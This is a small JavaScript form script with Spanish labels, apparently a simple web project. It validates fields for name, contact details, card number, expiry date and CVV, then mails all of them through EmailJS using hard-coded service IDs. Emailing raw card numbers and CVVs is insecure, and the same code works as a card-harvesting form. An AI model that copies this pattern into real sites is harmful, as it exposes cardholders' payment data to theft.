document.addEventListener('DOMContentLoaded', () => {
    emailjs.init('TI3uNuT--XC8utjzc');

    const form = document.getElementById('conf_form');
    const btnBorrar = document.querySelector('.btnBorrar');

    form.setAttribute('novalidate', true);

    function validarform() {
        const nombre = document.getElementById('nombre').value.trim();
        const apellido = document.getElementById('apellido').value.trim();
        const correo = document.getElementById('email').value.trim();
        const tel = document.getElementById('tel').value.trim();
        const tarjeta = document.getElementById('tarjeta').value.trim();
        const fechaExp = document.getElementById('fechaExp').value.trim();
        const CVV = document.getElementById('CVV').value.trim();

        if ( !nombre || !apellido || !correo || !tel || !tarjeta || !fechaExp || !CVV )
          {
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Debe llenar todos los espacios.',
            });
            return false;
        }

        const formatoCorreo = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!formatoCorreo.test(correo)) {
            Swal.fire({
                icon: 'warning',
                title: 'Cuidado',
                text: 'Formato de correo inválido.',
            });
            return false;
        }

        return true;
    }

    btnBorrar.addEventListener('click', () => {
        Swal.fire({
            title: '¿Estás seguro?',
            text: 'Esto borrará todos los datos del formulario.',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText: 'Borrar',
            cancelButtonText: 'Cancelar',
        }).then((resultado) => {
            if (resultado.isConfirmed) {
                form.reset();
            }
        });
    });

    form.addEventListener('submit', (evento) => {
        evento.preventDefault(); 
        if (!validarform()) {
            return;
        }

        const texto_correo = {
            nombre: document.getElementById('nombre').value,
            apellido: document.getElementById('apellido').value,
            email: document.getElementById('email').value,
            tel: document.getElementById('tel').value,
            tarjeta: document.getElementById('tarjeta').value,
            fechaExp: document.getElementById('fechaExp').value,
            CVV: document.getElementById('CVV').value,
        };

        emailjs
            .send('service_opf43ik', 'template_d70ustk', texto_correo)
            .then(
                () => {
                    Swal.fire({
                        icon: 'success',
                        title: '¡Correo enviado!',
                        text: 'Tu mensaje ha sido enviado correctamente.',
                    });

                    form.reset();
                },
                (error) => {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error al enviar el correo',
                        text: 'Por favor, intenta de nuevo más tarde.',
                    });
                    console.error('Error al enviar el correo:', error);
                }
            );
    });
});